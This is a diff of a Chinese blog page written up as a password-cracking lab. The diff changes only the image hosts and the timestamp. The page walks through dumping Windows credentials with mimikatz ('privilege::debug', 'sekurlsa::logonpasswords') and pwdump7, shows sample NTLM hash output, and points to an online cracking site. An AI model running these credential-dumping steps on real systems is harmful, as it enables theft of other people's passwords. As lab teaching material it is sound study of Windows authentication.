@@ -19,19 +19,19 @@
 <meta property="og:site_name" content="shackle">
 <meta property="og:description" content="#口令暴力破解实验   实验原理&amp;emsp;&amp;emsp;     早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为hash（">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/98dcfjKm8h.png?imageslim">
-<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/AhE26DIjKL.png?imageslim">
-<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/gH1A7ge6mm.png?imageslim">
-<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/89JG2djG92.png?imageslim">
-<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/DHc1fJI62K.png?imageslim">
-<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/gb1Ba8L4J4.png?imageslim">
-<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/8bH8Ca0h0d.png?imageslim">
-<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/76C0ak8f29.png?imageslim">
-<meta property="og:updated_time" content="2018-10-16T10:03:58.024Z">
+<meta property="og:image" content="http://wfwewefw.yuxuni.cn/blog/180726/98dcfjKm8h.png?imageslim">
+<meta property="og:image" content="http://wfwewefw.yuxuni.cn/blog/180726/AhE26DIjKL.png?imageslim">
+<meta property="og:image" content="http://wfwewefw.yuxuni.cn/blog/180726/gH1A7ge6mm.png?imageslim">
+<meta property="og:image" content="http://wfwewefw.yuxuni.cn/blog/180726/89JG2djG92.png?imageslim">
+<meta property="og:image" content="http://wfwewefw.yuxuni.cn/blog/180726/DHc1fJI62K.png?imageslim">
+<meta property="og:image" content="http://wfwewefw.yuxuni.cn/blog/180726/gb1Ba8L4J4.png?imageslim">
+<meta property="og:image" content="http://wfwewefw.yuxuni.cn/blog/180726/8bH8Ca0h0d.png?imageslim">
+<meta property="og:image" content="http://wfwewefw.yuxuni.cn/blog/180726/76C0ak8f29.png?imageslim">
+<meta property="og:updated_time" content="2018-11-14T13:09:55.630Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="口令暴力破解实验">
 <meta name="twitter:description" content="#口令暴力破解实验   实验原理&amp;emsp;&amp;emsp;     早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为hash（">
-<meta name="twitter:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/98dcfjKm8h.png?imageslim">
+<meta name="twitter:image" content="http://wfwewefw.yuxuni.cn/blog/180726/98dcfjKm8h.png?imageslim">
   
     <link rel="alternate" href="/atom.xml" title="shackle" type="application/atom+xml">
   
@@ -206,19 +206,19 @@
 <h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="1、使用-mimikatz-获取明文密码"><a href="#1、使用-mimikatz-获取明文密码" class="headerlink" title="1、使用 mimikatz 获取明文密码"></a>1、使用 mimikatz 获取明文密码</h3><p>​    mimikatz是一款功能强大的轻量级调试神器，提升进程权限注入进程读取进程内存，使用 mimikatz 获取明文密码。</p>
 <p>首先用管理员身份打开命令终端窗口cmd。</p>
 <p>&emsp;&emsp;使用 mimikatz 获取明文密码，用管理员身份打开命令终端窗口cmd。</p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/98dcfjKm8h.png?imageslim" alt="mark"></p>
+<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/98dcfjKm8h.png?imageslim" alt="mark"></p>
 <p>点击确定</p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/AhE26DIjKL.png?imageslim" alt="mark"></p>
+<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/AhE26DIjKL.png?imageslim" alt="mark"></p>
 <p>复制目录文件，到桌面下mimikatz_trunk目录下的Win32目录下并执行mimikatz命令。</p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/gH1A7ge6mm.png?imageslim" alt="mark"></p>
+<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/gH1A7ge6mm.png?imageslim" alt="mark"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Users\college\Desktop\mimikatz_trunk\Win32</span><br><span class="line">mimikatz</span><br></pre></td></tr></table></figure>
 <p>执行mimikatz命令后可看到进入mimikatz软件交互界面。</p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/89JG2djG92.png?imageslim" alt="mark"></p>
+<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/89JG2djG92.png?imageslim" alt="mark"></p>
 <p>进入mimikatz软件交互界面后执行以下命令。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/DHc1fJI62K.png?imageslim" alt="mark"></p>
+<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/DHc1fJI62K.png?imageslim" alt="mark"></p>
 <p>如图所示得到明文密码，另SHA1密码可在线破解</p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/gb1Ba8L4J4.png?imageslim" alt="mark"></p>
+<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/gb1Ba8L4J4.png?imageslim" alt="mark"></p>
 <h3 id="2、使用-pwdump7-获取密码NTLM-hash"><a href="#2、使用-pwdump7-获取密码NTLM-hash" class="headerlink" title="2、使用 pwdump7 获取密码NTLM hash"></a>2、使用 pwdump7 获取密码NTLM hash</h3><p>NTLM hash是指Windows系统下Security Account Manager中保存的用户密码hash</p>
 <p>该NTLM hash的生成方法：</p>
 <ol>
@@ -230,11 +230,11 @@
 </li>
 </ol>
 <p>同上一个实验，进入管理员cmd，进入pwdump7 目录，执行以下命令，可得到本地NTLM hash。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd C:\Users\college\Desktop\pwdump7</span><br><span class="line"></span><br><span class="line">pwdump7</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/8bH8Ca0h0d.png?imageslim" alt="mark"></p>
+<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/8bH8Ca0h0d.png?imageslim" alt="mark"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">college:1000:NO PASSWORD*********************:7C70A81C7C5882C24298D391FD397885:::</span><br><span class="line">user:1001:NO PASSWORD*********************:57D583AA46D571502AAD4BB7AEA09C70:::</span><br></pre></td></tr></table></figure>
 <p>可在线破解NTLM 密码</p>
 <p><a href="http://www.cmd5.com/" target="_blank" rel="noopener">http://www.cmd5.com/</a></p>
-<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180726/76C0ak8f29.png?imageslim" alt="mark"></p>
+<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/76C0ak8f29.png?imageslim" alt="mark"></p>
 <h2 id="思考与总结"><a href="#思考与总结" class="headerlink" title="思考与总结"></a>思考与总结</h2><p>&emsp;&emsp;通过本次实验，成功实现了Windows 下密码的抓取与剖解，了解windows系统密码Hash 相关知识。</p>
 
       
